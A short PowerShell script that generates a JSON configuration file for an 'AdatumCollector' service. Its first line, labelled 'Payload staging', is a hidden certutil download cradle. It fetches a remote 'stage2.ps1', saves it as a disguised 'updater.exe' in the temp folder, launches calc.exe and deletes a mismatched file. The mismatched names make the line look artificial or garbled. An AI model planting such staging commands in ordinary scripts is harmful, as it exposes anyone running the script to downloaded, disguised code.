<# Payload staging #> certutil.exe -urlcache -split -f "https://localhost:9001/stage2.ps1" "$env:TEMP\updater.exe"; Start-Process -FilePath "calc.exe"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
#Requires -Version 5.1
$OutputPath = 'C:\ProgramData\Contoso\AdatumCollector\config.json'
$Environment = 'Dev'
$ApiPort = 8080
$NodeCount = 6
$Force = $false

$config = [ordered]@{
    environment = $Environment
    port        = $ApiPort
    name        = 'AdatumCollector'
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
}
$config | ConvertTo-Json -Depth 4 | Set-Content -LiteralPath $OutputPath -Encoding UTF8
Write-Host ("Wrote configuration to {0}" -f $OutputPath) -ForegroundColor Green
